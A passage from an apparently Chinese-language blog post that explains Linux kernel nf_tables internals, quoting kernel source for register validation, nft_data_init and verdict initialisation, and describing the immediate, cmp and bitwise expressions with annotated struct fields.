class="hljs-number">0</span>;<br>&#125;<br>EXPORT_SYMBOL_GPL(nft_parse_register_load);<br></code></pre></td></tr></table></figure><ul><li><p><strong>nft_parse_register</strong> 获取index</p></li><li><p><strong>nft_validate_register_load</strong> 检验index合法性</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">int</span> <span class="hljs-title function_">nft_validate_register_load</span><span class="hljs-params">(<span class="hljs-keyword">enum</span> nft_registers reg, <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> len)</span><br>&#123;<br><span class="hljs-keyword">if</span> (reg &lt; NFT_REG_1 * NFT_REG_SIZE / NFT_REG32_SIZE)<br><span class="hljs-keyword">return</span> -EINVAL;<br><span class="hljs-keyword">if</span> (len == <span class="hljs-number">0</span>)<br><span class="hljs-keyword">return</span> -EINVAL;<br><span class="hljs-keyword">if</span> (reg * NFT_REG32_SIZE + len &gt; sizeof_field(<span class="hljs-keyword">struct</span> nft_regs, data))<br><span class="hljs-keyword">return</span> -ERANGE;<br><br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><ul><li>源寄存器不能是verdict</li><li>读取长度不能为0</li><li>读取范围不能超出nft_regs结构体</li></ul></li><li><p>将index赋值给expr</p></li></ul></li><li><p><strong>nft_parse_register_store</strong>：解析目标寄存器</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> <span class="hljs-title function_">nft_parse_register_store</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-keyword">struct</span> nft_ctx *ctx,</span><br><span class="hljs-params">     <span class="hljs-type">const</span> <span class="hljs-keyword">struct</span> nlattr *attr, u8 *dreg,</span><br><span class="hljs-params">     <span class="hljs-type">const</span> <span class="hljs-keyword">struct</span> nft_data *data,</span><br><span class="hljs-params">     <span class="hljs-keyword">enum</span> nft_data_types type, <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> len)</span><br>&#123;<br><span class="hljs-type">int</span> err;<br>u32 reg;<br><br>reg = nft_parse_register(attr);<br>err = nft_validate_register_store(ctx, reg, data, type, len);<br><span class="hljs-keyword">if</span> (err &lt; <span class="hljs-number">0</span>)<br><span class="hljs-keyword">return</span> err;<br><br>*dreg = reg;<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br>EXPORT_SYMBOL_GPL(nft_parse_register_store);<br></code></pre></td></tr></table></figure><p>同上👆</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">int</span> <span class="hljs-title function_">nft_validate_register_store</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-keyword">struct</span> nft_ctx *ctx,</span><br><span class="hljs-params">       <span class="hljs-keyword">enum</span> nft_registers reg,</span><br><span class="hljs-params">       <span class="hljs-type">const</span> <span class="hljs-keyword">struct</span> nft_data *data,</span><br><span class="hljs-params">       <span class="hljs-keyword">enum</span> nft_data_types type,</span><br><span class="hljs-params">       <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> len)</span><br>&#123;<br><span class="hljs-type">int</span> err;<br><br><span class="hljs-keyword">switch</span> (reg) &#123;<br><span class="hljs-keyword">case</span> NFT_REG_VERDICT:<br><span class="hljs-keyword">if</span> (type != NFT_DATA_VERDICT)<br><span class="hljs-keyword">return</span> -EINVAL;<br><br><span class="hljs-keyword">if</span> (data != <span class="hljs-literal">NULL</span> &amp;&amp;<br>    (data-&gt;verdict.code == NFT_GOTO ||<br>     data-&gt;verdict.code == NFT_JUMP)) &#123;<br>err = nf_tables_check_loops(ctx, data-&gt;verdict.chain);<br><span class="hljs-keyword">if</span> (err &lt; <span class="hljs-number">0</span>)<br><span class="hljs-keyword">return</span> err;<br>&#125;<br><br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br><span class="hljs-keyword">default</span>:<br><span class="hljs-keyword">if</span> (reg &lt; NFT_REG_1 * NFT_REG_SIZE / NFT_REG32_SIZE)<br><span class="hljs-keyword">return</span> -EINVAL;<br><span class="hljs-keyword">if</span> (len == <span class="hljs-number">0</span>)<br><span class="hljs-keyword">return</span> -EINVAL;<br><span class="hljs-keyword">if</span> (reg * NFT_REG32_SIZE + len &gt;<br>    sizeof_field(<span class="hljs-keyword">struct</span> nft_regs, data))<br><span class="hljs-keyword">return</span> -ERANGE;<br><br><span class="hljs-keyword">if</span> (data != <span class="hljs-literal">NULL</span> &amp;&amp; type != NFT_DATA_VALUE)<br><span class="hljs-keyword">return</span> -EINVAL;<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><ul><li>目的寄存器为verdict<ul><li>type要匹配</li><li>写入code为两个跳转指令时需要调用 <strong>nf_tables_check_loops</strong> 判断是否产生了循环</li></ul></li><li>index不能落在verdict的范围里</li></ul></li></ul><h5 id="nft-data-init"><a href="#nft-data-init" class="headerlink" title="nft_data_init"></a>nft_data_init</h5><p>这个函数用于解析data，初始化nft_data结构体，用于表示常量或者verdict</p><ul><li>ctx：expression上下文</li><li>data：待初始化的data结构体</li><li>size：data的最大长度限制</li><li>desc：data的描述结构体</li><li>nla：待解析的data</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> <span class="hljs-title function_">nft_data_init</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-keyword">struct</span> nft_ctx *ctx,</span><br><span class="hljs-params">  <span class="hljs-keyword">struct</span> nft_data *data, <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> size,</span><br><span class="hljs-params">  <span class="hljs-keyword">struct</span> nft_data_desc *desc, <span class="hljs-type">const</span> <span class="hljs-keyword">struct</span> nlattr *nla)</span><br>&#123;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">nlattr</span> *<span class="hljs-title">tb</span>[<span class="hljs-title">NFTA_DATA_MAX</span> + 1];</span><br><span class="hljs-type">int</span> err;<br><br>    <span class="hljs-comment">/*</span><br><span class="hljs-comment">     * 1. 解析nla中的data，并将各个部分指针放进指针数组tb</span><br><span class="hljs-comment">     */</span><br>err = nla_parse_nested_deprecated(tb, NFTA_DATA_MAX, nla,<br>  nft_data_policy, <span class="hljs-literal">NULL</span>);<br><span class="hljs-keyword">if</span> (err &lt; <span class="hljs-number">0</span>)<br><span class="hljs-keyword">return</span> err;<br><br>    <span class="hljs-comment">/*</span><br><span class="hljs-comment">     * 2. 数据类型是普通的data，初始化nft_data结构体</span><br><span class="hljs-comment">     */</span><br><span class="hljs-keyword">if</span> (tb[NFTA_DATA_VALUE])<br><span class="hljs-keyword">return</span> nft_value_init(ctx, data, size, desc,<br>      tb[NFTA_DATA_VALUE]);<br>    <br>    <span class="hljs-comment">/*</span><br><span class="hljs-comment">     * 3. 数据类型是verdict，初始化verdict结构体</span><br><span class="hljs-comment">     */</span><br><span class="hljs-keyword">if</span> (tb[NFTA_DATA_VERDICT] &amp;&amp; ctx != <span class="hljs-literal">NULL</span>)<br><span class="hljs-keyword">return</span> nft_verdict_init(ctx, data, desc, tb[NFTA_DATA_VERDICT]);<br><span class="hljs-keyword">return</span> -EINVAL;<br>&#125;<br>EXPORT_SYMBOL_GPL(nft_data_init);<br></code></pre></td></tr></table></figure><ul><li><p><strong>nft_value_init</strong> 数据复制，长度不能超过size的限制</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">nft_data</span> &#123;</span><br><span class="hljs-class"><span class="hljs-keyword">union</span> &#123;</span><br>u32data[<span class="hljs-number">4</span>];<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">nft_verdict</span><span class="hljs-title">verdict</span>;</span><br>&#125;;<br>&#125; __attribute__((aligned(__alignof__(u64))));<br></code></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">int</span> <span class="hljs-title function_">nft_value_init</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-keyword">struct</span> nft_ctx *ctx,</span><br><span class="hljs-params">  <span class="hljs-keyword">struct</span> nft_data *data, <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> size,</span><br><span class="hljs-params">  <span class="hljs-keyword">struct</span> nft_data_desc *desc, <span class="hljs-type">const</span> <span class="hljs-keyword">struct</span> nlattr *nla)</span><br>&#123;<br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> len;<br><br>len = nla_len(nla);<br><span class="hljs-keyword">if</span> (len == <span class="hljs-number">0</span>)<br><span class="hljs-keyword">return</span> -EINVAL;<br><span class="hljs-keyword">if</span> (len &gt; size)<br><span class="hljs-keyword">return</span> -EOVERFLOW;<br><br>nla_memcpy(data-&gt;data, nla, len);<br>desc-&gt;type = NFT_DATA_VALUE;<br>desc-&gt;len  = len;<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure></li><li><p><strong>nft_verdict_init</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">nft_verdict</span> &#123;</span><br>u32code;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">nft_chain</span>*<span class="hljs-title">chain</span>;</span><br>&#125;;<br></code></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">int</span> <span class="hljs-title function_">nft_verdict_init</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-keyword">struct</span> nft_ctx *ctx, <span class="hljs-keyword">struct</span> nft_data *data,</span><br><span class="hljs-params">    <span class="hljs-keyword">struct</span> nft_data_desc *desc, <span class="hljs-type">const</span> <span class="hljs-keyword">struct</span> nlattr *nla)</span><br>&#123;<br>u8 genmask = nft_genmask_next(ctx-&gt;net);<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">nlattr</span> *<span class="hljs-title">tb</span>[<span class="hljs-title">NFTA_VERDICT_MAX</span> + 1];</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">nft_chain</span> *<span class="hljs-title">chain</span>;</span><br><span class="hljs-type">int</span> err;<br><br>    <span class="hljs-comment">/*</span><br><span class="hljs-comment">     * 1. 解析nla中的data，并将各个部分指针放进指针数组tb</span><br><span class="hljs-comment">     */</span><br>err = nla_parse_nested_deprecated(tb, NFTA_VERDICT_MAX, nla,<br>  nft_verdict_policy, <span class="hljs-literal">NULL</span>);<br><span class="hljs-keyword">if</span> (err &lt; <span class="hljs-number">0</span>)<br><span class="hljs-keyword">return</span> err;<br><br>    <span class="hljs-comment">/*</span><br><span class="hljs-comment">     * 2. verdict.code的赋值</span><br><span class="hljs-comment">     */</span><br><span class="hljs-keyword">if</span> (!tb[NFTA_VERDICT_CODE])<br><span class="hljs-keyword">return</span> -EINVAL;<br>data-&gt;verdict.code = ntohl(nla_get_be32(tb[NFTA_VERDICT_CODE]));<br><br>    <span class="hljs-comment">/*</span><br><span class="hljs-comment">     * 3. 根据链名或id查找chain并赋值给verdict.chain</span><br><span class="hljs-comment">     */</span><br><span class="hljs-keyword">switch</span> (data-&gt;verdict.code) &#123;<br><span class="hljs-keyword">default</span>:<br><span class="hljs-keyword">switch</span> (data-&gt;verdict.code &amp; NF_VERDICT_MASK) &#123;<br><span class="hljs-keyword">case</span> NF_ACCEPT:<br><span class="hljs-keyword">case</span> NF_DROP:<br><span class="hljs-keyword">case</span> NF_QUEUE:<br><span class="hljs-keyword">break</span>;<br><span class="hljs-keyword">default</span>:<br><span class="hljs-keyword">return</span> -EINVAL;<br>&#125;<br>fallthrough;<br><span class="hljs-keyword">case</span> NFT_CONTINUE:<br><span class="hljs-keyword">case</span> NFT_BREAK:<br><span class="hljs-keyword">case</span> NFT_RETURN:<br><span class="hljs-keyword">break</span>;<br><span class="hljs-keyword">case</span> NFT_JUMP:<br><span class="hljs-keyword">case</span> NFT_GOTO:<br><span class="hljs-keyword">if</span> (tb[NFTA_VERDICT_CHAIN]) &#123;<br>chain = nft_chain_lookup(ctx-&gt;net, ctx-&gt;table,<br> tb[NFTA_VERDICT_CHAIN],<br> genmask);<br>&#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (tb[NFTA_VERDICT_CHAIN_ID]) &#123;<br>chain = nft_chain_lookup_byid(ctx-&gt;net,<br>      tb[NFTA_VERDICT_CHAIN_ID]);<br><span class="hljs-keyword">if</span> (IS_ERR(chain))<br><span class="hljs-keyword">return</span> PTR_ERR(chain);<br>&#125; <span class="hljs-keyword">else</span> &#123;<br><span class="hljs-keyword">return</span> -EINVAL;<br>&#125;<br><br><span class="hljs-keyword">if</span> (IS_ERR(chain))<br><span class="hljs-keyword">return</span> PTR_ERR(chain);<br><span class="hljs-keyword">if</span> (nft_is_base_chain(chain))<br><span class="hljs-keyword">return</span> -EOPNOTSUPP;<br><br>chain-&gt;use++;<br>data-&gt;verdict.chain = chain;<br><span class="hljs-keyword">break</span>;<br>&#125;<br><br>desc-&gt;len = <span class="hljs-keyword">sizeof</span>(data-&gt;verdict);<br>desc-&gt;type = NFT_DATA_VERDICT;<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure></li></ul><h4 id="nft-immediate-expr"><a href="#nft-immediate-expr" class="headerlink" title="nft_immediate_expr"></a>nft_immediate_expr</h4><ul><li><p><strong>结构</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">nft_immediate_expr</span> &#123;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">nft_data</span><span class="hljs-title">data</span>;</span><br>u8dreg;<br>u8dlen;<br>&#125;;<br></code></pre></td></tr></table></figure><ul><li>data：要写入的常量</li><li>dreg：目标寄存器index</li><li>dlen：要写入的常量的长度，&lt;16</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">int</span> <span class="hljs-title function_">nft_immediate_init</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-keyword">struct</span> nft_ctx *ctx,</span><br><span class="hljs-params">      <span class="hljs-type">const</span> <span class="hljs-keyword">struct</span> nft_expr *expr,</span><br><span class="hljs-params">      <span class="hljs-type">const</span> <span class="hljs-keyword">struct</span> nlattr * <span class="hljs-type">const</span> tb[])</span><br>&#123;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">nft_immediate_expr</span> *<span class="hljs-title">priv</span> =</span> nft_expr_priv(expr);<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">nft_data_desc</span> <span class="hljs-title">desc</span>;</span><br><span class="hljs-type">int</span> err;<br><br><span class="hljs-keyword">if</span> (tb[NFTA_IMMEDIATE_DREG] == <span class="hljs-literal">NULL</span> ||<br>    tb[NFTA_IMMEDIATE_DATA] == <span class="hljs-literal">NULL</span>)<br><span class="hljs-keyword">return</span> -EINVAL;<br><br>    <span class="hljs-comment">/*</span><br><span class="hljs-comment">     * 1. 要写入的data初始化，size限制len在nft_data结构体范围内</span><br><span class="hljs-comment">     */</span><br>err = nft_data_init(ctx, &amp;priv-&gt;data, <span class="hljs-keyword">sizeof</span>(priv-&gt;data), &amp;desc,<br>    tb[NFTA_IMMEDIATE_DATA]);<br><span class="hljs-keyword">if</span> (err &lt; <span class="hljs-number">0</span>)<br><span class="hljs-keyword">return</span> err;<br><br>priv-&gt;dlen = desc.len;<br><br>    <span class="hljs-comment">/*</span><br><span class="hljs-comment">     * 2. 目的寄存器index解析</span><br><span class="hljs-comment">     */</span><br>err = nft_parse_register_store(ctx, tb[NFTA_IMMEDIATE_DREG],<br>       &amp;priv-&gt;dreg, &amp;priv-&gt;data, desc.type,<br>       desc.len);<br><span class="hljs-keyword">if</span> (err &lt; <span class="hljs-number">0</span>)<br><span class="hljs-keyword">goto</span> err1;<br><br>    <span class="hljs-comment">/*</span><br><span class="hljs-comment">     * 3. 如果目的寄存器是verdict，且为跳转则需要判定目标链</span><br><span class="hljs-comment">     */</span><br><span class="hljs-keyword">if</span> (priv-&gt;dreg == NFT_REG_VERDICT) &#123;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">nft_chain</span> *<span class="hljs-title">chain</span> =</span> priv-&gt;data.verdict.chain;<br><br><span class="hljs-keyword">switch</span> (priv-&gt;data.verdict.code) &#123;<br><span class="hljs-keyword">case</span> NFT_JUMP:<br><span class="hljs-keyword">case</span> NFT_GOTO:<br><span class="hljs-keyword">if</span> (nft_chain_is_bound(chain)) &#123;<br>err = -EBUSY;<br><span class="hljs-keyword">goto</span> err1;<br>&#125;<br>chain-&gt;bound = <span class="hljs-literal">true</span>;<br><span class="hljs-keyword">break</span>;<br><span class="hljs-keyword">default</span>:<br><span class="hljs-keyword">break</span>;<br>&#125;<br>&#125;<br><br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br><br>err1:<br>nft_data_release(&amp;priv-&gt;data, desc.type);<br><span class="hljs-keyword">return</span> err;<br>&#125;<br></code></pre></td></tr></table></figure></li><li><p><strong>用途</strong> 往寄存器中写入最多16bytes的常量</p><p>就是利用 <strong>nft_data_copy</strong> 函数之间进行数据复制</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> <span class="hljs-title function_">nft_immediate_eval</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-keyword">struct</span> nft_expr *expr,</span><br><span class="hljs-params"><span class="hljs-keyword">struct</span> nft_regs *regs,</span><br><span class="hljs-params"><span class="hljs-type">const</span> <span class="hljs-keyword">struct</span> nft_pktinfo *pkt)</span><br>&#123;<br><span class="hljs-type">const</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">nft_immediate_expr</span> *<span class="hljs-title">priv</span> =</span> nft_expr_priv(expr);<br><br>nft_data_copy(&amp;regs-&gt;data[priv-&gt;dreg], &amp;priv-&gt;data, priv-&gt;dlen);<br>&#125;<br></code></pre></td></tr></table></figure></li></ul><h4 id="nft-cmp-expr"><a href="#nft-cmp-expr" class="headerlink" title="nft_cmp_expr"></a>nft_cmp_expr</h4><ul><li><p><strong>结构</strong></p><p>这个结构有select函数</p><ul><li>32字节以下 &amp;&amp; 是否相等的比较使用 <strong>nft_cmp_fast_ops</strong></li><li>否则使用 <strong>nft_cmp_ops</strong></li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">nft_cmp_expr</span> &#123;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">nft_data</span><span class="hljs-title">data</span>;</span><br>u8sreg;<br>u8len;<br><span class="hljs-class"><span class="hljs-keyword">enum</span> <span class="hljs-title">nft_cmp_ops</span><span class="hljs-title">op</span>:</span><span class="hljs-number">8</span>;<br>&#125;;<br></code></pre></td></tr></table></figure><ul><li>data：常量，调用nft_data_init初始化</li><li>sreg：源寄存器index，调用nft_parse_register_load获取</li><li>len：常量长度，&lt;16</li><li>op：哪种判断，大于？小于？…</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">nft_cmp_fast_expr</span> &#123;</span><br>u32data;<br>u32mask;<br>u8sreg;<br>u8len;<br><span class="hljs-type">bool</span>inv;<br>&#125;;<br></code></pre></td></tr></table></figure><ul><li>data：常量，调用nft_data_init初始化</li><li>mask：掩码</li><li>sreg：源寄存器index，调用nft_parse_register_load获取</li><li>len：常量长度，限制在nft_data结构体范围内</li><li>inv：相等 or 不相等</li></ul></li><li><p><strong>用途</strong> 将寄存器值和常量进行比较</p><p>计算时</p><ul><li><strong>nft_cmp_eval</strong> 就是使用memcmp并对结果进行判断，match则break，否则continue</li><li><strong>nft_cmp_fast_eval</strong> 直接使用等号判断，再判断和inv是否match</li></ul></li></ul><h4 id="nft-bitwise-expr"><a href="#nft-bitwise-expr" class="headerlink" title="nft_bitwise_expr"></a>nft_bitwise_expr</h4><ul><li><p><strong>结构</strong></p><p>有select函数</p><ul><li>32位data &amp;&amp; 位操作为异或则使用 <strong>nft_bitwise_fast_ops</strong></li><li>否则使用 <strong>nft_bitwise_ops</strong></li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">nft_bitwise</span> &#123;</span><br>u8sreg;<br>u8dreg;<br><span class="hljs-class"><span class="hljs-keyword">enum</span> <span class="hljs-title">nft_bitwise_ops</span><span class="hljs-title">op</span>:</span><span class="hljs-number">8</span>;<br>u8len;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">nft_data</span><span class="hljs-title">mask</span>;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">nft_data</span><span class="hljs-title">xor</span>;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">nft_data</span><span class="hljs-title">data</span>;</span><br>&#125;;<br></code></pre></td></tr></table></figure><ul><li>sreg：源寄存器index，nft_parse_register_load获取</li><li>dreg：目的寄存器index，nft_parse_register_store获取</li><li>op：异或，左移或右移</li><li>len：操作数据长度，xor &lt;16，shift &lt;0xff</li><li>mask：掩码<ul><li>mask.len &#x3D;&#x3D; len</li><li>type &#x3D;&#x3D; NFT_DATA_VALUE</li><li>nft_data_init获取，nft_data结构体范围内</li></ul></li><li>xor：同上👆</li><li>data：位移位数<ul><li>type为NFT_DATA_VALUE</li><li>32位</li><li>&lt;32</li></ul></li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">nft_bitwise_fast_expr</span> &#123;</span><br>u32mask;<br>u32xor;<br>u8sreg;<br>u8dreg;<br>&#125;;<br></code></pre></td></tr></table></figure><ul><li>mask：源码</li><li>xor：异或数</li><li>sreg：源寄存器index</li><li>dreg：目的寄存器index</li></ul></li><li><p><strong>用途</strong> 位操作，异或，左移或右移</p><p>计算时</p><ul><li><strong>nft_bitwise_eval</strong><ul><li>bool：四字节为单位异或data和xor</li><li>lshift：data[0]表示位移位数</li><li>rshift：同上👆</li></ul></li><li><strong>nft_bitwise_fast_eval</strong> 直接异或</li></ul></li></ul><h4 id="nft-payload-expr"><a href="#nft-payload-expr" class="headerlink" title="nft_payload_expr"></a>nft_payload_expr</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span 